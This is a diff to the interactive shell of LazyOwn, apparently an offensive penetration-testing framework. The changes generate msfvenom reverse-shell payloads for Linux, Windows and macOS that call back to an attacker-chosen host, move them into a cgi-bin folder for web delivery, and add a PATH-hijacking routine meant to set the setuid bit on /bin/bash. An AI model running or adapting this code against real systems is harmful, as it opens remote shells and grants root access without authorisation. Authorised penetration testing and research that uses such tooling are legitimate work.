@@ -61,12 +61,17 @@ signal.signal(signal.SIGINT, signal_handler)
 
 class LazyOwnShell(Cmd):
     prompt = "LazyOwn> "
-    intro = "Welcome to the LazyOwn interactive shell! Type ? to list commands"
+    intro = """Welcome to the LazyOwn Framework [;,;] interactive shell! Type ? to list commands
+Github: https://github.com/grisuno/LazyOwn
+Web: https://grisuno.github.io/LazyOwn/
+Reddit: https://www.reddit.com/r/LazyOwn/
+Facebook: https://web.facebook.com/profile.php?id=61560596232150
+    """
 
     def __init__(self):
         super().__init__()
         self.params = {
-            "binary_name": None,
+            "binary_name": "gzip",
             "target_ip": "127.0.0.1",
             "api_key": None,
             "prompt": None,
@@ -124,7 +129,8 @@ class LazyOwnShell(Cmd):
             "lazysearch_bot",
             "lazylfi2rce",
             "lazylogpoisoning",
-            "lazymsfvenom"
+            "lazymsfvenom",
+            "lazypathhijacking"
         ]
         self.output = ""
 
@@ -361,9 +367,26 @@ class LazyOwnShell(Cmd):
         path = os.getcwd()
         if not lhost or not lport:
             print("[?] lport and lhost mus be set")
+            return
         os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f elf > shell.elf")
         os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f exe > shell.exe")
         os.system(f"msfvenom -p osx/x86/shell_reverse_tcp LHOST=\"{lhost}\" LPORT={lport} -f macho > shell.macho")
+        os.system("mv shell.* modules/cgi-bin")
+        os.system("chmod +x modules/cgi-bin/*")
+        print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
+        print("[?] To run web server exec command: lazywebshell [;,;] ")
+
+    def run_lazypathhijacking(self):
+        binary_name = self.params["binary_name"]
+        if not binary_name:
+            print("[?] binary_name must be set")
+            return
+        os.system(f"echo {binary_name} >> modules/tmp.sh")
+        os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
+        os.system(f"chmod +x /tmp/{binary_name}")
+        os.system("export PATH=/tmp:$PATH")
+        print(f"[*] Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash")
+
     def run_script(self, script_name, *args):
         """ Run a script with the given arguments """
         command = ["python3", script_name] + [str(arg) for arg in args]
